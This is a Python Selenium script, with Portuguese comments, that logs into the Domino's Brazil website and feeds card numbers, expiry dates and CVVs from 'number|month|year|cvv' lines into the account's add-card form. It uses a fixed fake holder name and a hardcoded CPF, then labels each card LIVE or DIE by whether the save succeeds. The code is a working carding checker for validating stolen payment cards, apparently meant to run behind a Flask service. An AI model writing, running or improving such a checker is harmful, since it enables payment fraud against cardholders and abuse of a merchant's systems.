import os
import time
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

class DominosChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.driver = None
        self.wait = None
        self.lock = threading.Lock()
        
    def start_session(self):
        if self.driver is not None:
            return True
            
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless') # Pode habiliatar headless se não quiser ver
        self.driver = webdriver.Chrome(options=options)
        self.wait = WebDriverWait(self.driver, 15)
        
        try:
            print("[Checker] Acessando login...")
            self.driver.get("https://www.dominos.com.br/login")
            
            btn_login_senha = self.wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(text(), 'Login com senha')] | //ion-button[contains(., 'Login com senha')]")
            ))
            self.driver.execute_script("arguments[0].click();", btn_login_senha)

            input_email = self.wait.until(EC.visibility_of_element_located((By.ID, "ion-input-0")))
            input_email.clear()
            input_email.send_keys(self.email)

            input_senha = self.wait.until(EC.visibility_of_element_located((By.ID, "ion-input-1")))
            input_senha.clear()
            input_senha.send_keys(self.password)

            btn_entrar = self.wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(text(), 'Entrar')] | //ion-button[contains(., 'Entrar')]")
            ))
            self.driver.execute_script("arguments[0].click();", btn_entrar)
            print("[Checker] Login submetido!")
            time.sleep(5)
            return True
        except Exception as e:
            print(f"[Checker] Erro no login: {e}")
            if self.driver:
                self.driver.quit()
                self.driver = None
            return False

    def test_card(self, linha):
        with self.lock:
            if not self.driver:
                if not self.start_session():
                    return "ERROR: Não foi possível fazer login na Dominos"

            linha = linha.strip()
            partes = linha.split("|")
            if len(partes) != 4:
                return "DIE"
            
            numero, mes, ano, cvv = partes
            if len(ano) == 4:
                ano = ano[-2:]

            try:
                self.driver.get("https://www.dominos.com.br/my-cards")
                time.sleep(3)

                btn_add_cartao = self.wait.until(EC.element_to_be_clickable(
                    (By.XPATH, "//*[contains(translate(text(), 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')] | //ion-button[contains(translate(., 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')]")
                ))
                self.driver.execute_script("arguments[0].click();", btn_add_cartao)
                time.sleep(2)

                ion_apelido = self.wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='name']")))
                self.driver.execute_script("arguments[0].scrollIntoView(true);", ion_apelido)
                time.sleep(0.5)
                ActionChains(self.driver).move_to_element(ion_apelido).click().send_keys("Afonso Claudio").perform()

                ion_titular = self.wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='holderName']")))
                ActionChains(self.driver).move_to_element(ion_titular).click().send_keys("Afonso Claudio").perform()

                ion_cpf = self.wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='cpf']")))
                ActionChains(self.driver).move_to_element(ion_cpf).click().send_keys("84830336072").perform()
                
                data_validade = f"{mes}{ano}"

                time.sleep(2)
                
                try: 
                    iframe_num = self.driver.find_elements(By.XPATH, "//iframe[@title='Iframe para número do cartão']")
                    if iframe_num: self.driver.switch_to.frame(iframe_num[0])
                    input_numero = self.wait.until(EC.presence_of_element_located((By.ID, "encryptedCardNumber")))
                    input_numero.send_keys(numero)
                finally:
                    self.driver.switch_to.default_content()

                try: 
                    iframe_exp = self.driver.find_elements(By.XPATH, "//iframe[@title='Iframe para data de validade']")
                    if iframe_exp: self.driver.switch_to.frame(iframe_exp[0])
                    input_validade = self.wait.until(EC.presence_of_element_located((By.ID, "encryptedExpiryDate")))
                    input_validade.send_keys(data_validade)
                finally:
                    self.driver.switch_to.default_content()

                try: 
                    iframe_cvv = self.driver.find_elements(By.XPATH, "//iframe[@title='Iframe para código de segurança']")
                    if iframe_cvv: self.driver.switch_to.frame(iframe_cvv[0])
                    input_cvv = self.wait.until(EC.presence_of_element_located((By.ID, "encryptedSecurityCode")))
                    input_cvv.send_keys(cvv)
                finally:
                    self.driver.switch_to.default_content()

                btn_salvar = self.wait.until(EC.presence_of_element_located(
                    (By.XPATH, "//*[translate(text(), 'SALVR', 'salvr')='salvar'] | //ion-button[contains(translate(., 'SALVR', 'salvr'), 'salvar')]")
                ))
                self.driver.execute_script("arguments[0].click();", btn_salvar)
                
                time.sleep(5)
                
                try:
                    cpf_ainda = self.driver.find_element(By.XPATH, "//input[@placeholder='CPF do titular']")
                    if cpf_ainda.is_displayed():
                        return "DIE"
                    else:
                        return "LIVE"
                except:
                    return "LIVE"
                    
            except Exception as ex:
                print(f"[Checker] Erro no teste do {numero}: {ex}")
                return "DIE"

    def stop_session(self):
        if self.driver:
            self.driver.quit()
            self.driver = None

# Instância global para ser usada pelas rotas Flask
checker_instance = None
